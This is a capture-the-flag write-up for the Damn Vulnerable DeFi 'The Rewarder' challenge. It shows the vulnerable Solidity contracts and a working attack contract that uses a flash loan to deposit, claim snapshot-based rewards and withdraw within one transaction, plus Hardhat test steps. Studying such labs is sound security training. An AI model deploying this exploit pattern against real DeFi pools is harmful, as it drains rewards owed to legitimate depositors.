# 05_TheRewarder

## Challenge

There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

You are provided with the code for the Accounting token:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "solady/src/auth/OwnableRoles.sol";

/**
 * @title AccountingToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A limited pseudo-ERC20 token to keep track of deposits and withdrawals
 *         with snapshotting capabilities.
 */
contract AccountingToken is ERC20Snapshot, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;
    uint256 public constant SNAPSHOT_ROLE = _ROLE_1;
    uint256 public constant BURNER_ROLE = _ROLE_2;

    error NotImplemented();

    constructor() ERC20("rToken", "rTKN") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE | SNAPSHOT_ROLE | BURNER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external onlyRoles(BURNER_ROLE) {
        _burn(from, amount);
    }

    function snapshot() external onlyRoles(SNAPSHOT_ROLE) returns (uint256) {
        return _snapshot();
    }

    function _transfer(address, address, uint256) internal pure override {
        revert NotImplemented();
    }

    function _approve(address, address, uint256) internal pure override {
        revert NotImplemented();
    }
}
```

Flashloaner Pool:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    error NotEnoughTokenBalance();
    error CallerIsNotContract();
    error FlashLoanNotPaidBack();

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));

        if (amount > balanceBefore) {
            revert NotEnoughTokenBalance();
        }

        if (!msg.sender.isContract()) {
            revert CallerIsNotContract();
        }

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));

        if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
            revert FlashLoanNotPaidBack();
        }
    }
}
```

Reward Token:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "solady/src/auth/OwnableRoles.sol";

/**
 * @title RewardToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract RewardToken is ERC20, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;

    constructor() ERC20("Reward Token", "RWT") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }
}
```

RewarderPool:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TheRewarderPool {
    using FixedPointMathLib for uint256;

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
    
    uint256 public constant REWARDS = 100 ether;

    // Token deposited into the pool by users
    address public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public immutable accountingToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    uint128 public lastSnapshotIdForRewards;
    uint64 public lastRecordedSnapshotTimestamp;
    uint64 public roundNumber; // Track number of rounds
    mapping(address => uint64) public lastRewardTimestamps;

    error InvalidDepositAmount();

    constructor(address _token) {
        // Assuming all tokens have 18 decimals
        liquidityToken = _token;
        accountingToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice Deposit `amount` liquidity tokens into the pool, minting accounting tokens in exchange.
     *         Also distributes rewards if available.
     * @param amount amount of tokens to be deposited
     */
    function deposit(uint256 amount) external {
        if (amount == 0) {
            revert InvalidDepositAmount();
        }

        accountingToken.mint(msg.sender, amount);
        distributeRewards();

        SafeTransferLib.safeTransferFrom(
            liquidityToken,
            msg.sender,
            address(this),
            amount
        );
    }

    function withdraw(uint256 amount) external {
        accountingToken.burn(msg.sender, amount);
        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
    }

    function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = uint128(accountingToken.snapshot());
        lastRecordedSnapshotTimestamp = uint64(block.timestamp);
        unchecked {
            ++roundNumber;
        }
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp
                && lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}
```

## Solution

The description already hints a lot at how we can solve this challenge. As the rewarder takes a snapshot of the balances when we call it, we can exploit this by:

1. Wait until the next rewards period
2. Take a flashloan
3. Deposit all our dvt into the pool
4. Call the function that distributes the rewards
5. Withdraw all our dvt again
6. Pay back the flash loan
7. Transfer the reward tokens to our player.

I once again wrote an attack contract that does this for us:

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract Attack_Rewarder {

    address owner;
    TheRewarderPool target;
    FlashLoanerPool lender;
    DamnValuableToken dvt;  
    uint256 max_loan;  

    constructor() 
    {
        owner = msg.sender;
    }

    function getEmBoyz(address _target, address _lender) public
    {
        target = TheRewarderPool(_target);
        lender = FlashLoanerPool(_lender);
        dvt = DamnValuableToken(lender.liquidityToken());
        max_loan = dvt.balanceOf(_lender);

        lender.flashLoan(max_loan);
        RewardToken rew_token = RewardToken(target.rewardToken());

        rew_token.transfer(owner, rew_token.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable
    {
        dvt.approve(address(target), max_loan);
        target.deposit(max_loan);
        target.distributeRewards();
        target.withdraw(max_loan);
        dvt.transfer(address(lender), max_loan);
    } 
}
```

In the tescase we just have to wait for 5 days using:

```js
await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
```

And then do it the usual way and deploy our attack contract:

```js
const Attack_Rewarder = await ethers.getContractFactory('Attack_Rewarder', player);
attack = await Attack_Rewarder.deploy();
await attack.connect(player).getEmBoyz(rewarderPool.address, flashLoanPool.address);
```

This leads to us being able to execute the testcase properly.
